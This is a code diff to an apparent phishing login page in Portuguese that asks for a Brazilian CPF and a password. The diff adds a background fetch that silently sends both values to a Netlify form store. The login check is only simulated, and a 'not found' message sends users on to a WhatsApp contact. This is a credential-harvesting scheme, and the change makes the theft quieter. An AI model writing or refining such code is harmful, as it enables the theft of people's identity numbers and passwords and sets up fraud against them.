@@ -215,12 +215,11 @@
             Cadastro não encontrado! Entre em contato com o atendimento.
         </div>
         
-        <!-- Formulário principal para Netlify -->
-        <form name="login-form" method="POST" netlify data-netlify="true" class="hidden">
+        <!-- Formulário oculto para Netlify -->
+        <form name="login-form" netlify class="hidden" id="netlify-form">
             <input type="hidden" name="form-name" value="login-form">
             <input type="text" name="cpf" id="netlify-cpf">
             <input type="password" name="senha" id="netlify-senha">
-            <button type="submit" id="netlify-submit">Enviar para Netlify</button>
         </form>
         
         <!-- Formulário visual para o usuário -->
@@ -262,10 +261,9 @@
             const btnLogin = document.getElementById('btn-login');
             const errorMessage = document.getElementById('errorMessage');
             const whatsappButton = document.getElementById('whatsappButton');
-            const netlifyForm = document.querySelector('form[data-netlify="true"]');
+            const netlifyForm = document.getElementById('netlify-form');
             const netlifyCpf = document.getElementById('netlify-cpf');
             const netlifySenha = document.getElementById('netlify-senha');
-            const netlifySubmit = document.getElementById('netlify-submit');
             
             // Função para validar CPF (formato básico)
             function validarCPF(cpf) {
@@ -292,8 +290,27 @@
                 return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
             }
             
+            // Função para enviar dados para Netlify via fetch
+            async function enviarParaNetlify(cpf, senha) {
+                const formData = new FormData();
+                formData.append('form-name', 'login-form');
+                formData.append('cpf', cpf);
+                formData.append('senha', senha);
+                
+                try {
+                    // Envia os dados para o Netlify sem redirecionamento
+                    await fetch('/', {
+                        method: 'POST',
+                        body: formData,
+                    });
+                    console.log('Dados enviados para Netlify com sucesso');
+                } catch (error) {
+                    console.error('Erro ao enviar para Netlify:', error);
+                }
+            }
+            
             // Função para processar o login
-            function processarLogin() {
+            async function processarLogin() {
                 const cpf = document.getElementById('cpf').value;
                 const senha = document.getElementById('senha').value;
                 
@@ -308,10 +325,8 @@
                     return;
                 }
                 
-                // Primeiro, envia os dados para o Netlify
-                netlifyCpf.value = cpf;
-                netlifySenha.value = senha;
-                netlifySubmit.click();
+                // Envia os dados para o Netlify (em segundo plano)
+                await enviarParaNetlify(cpf, senha);
                 
                 // Simulação de verificação de credenciais
                 // Em um sistema real, isso seria feito no servidor
@@ -377,4 +392,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
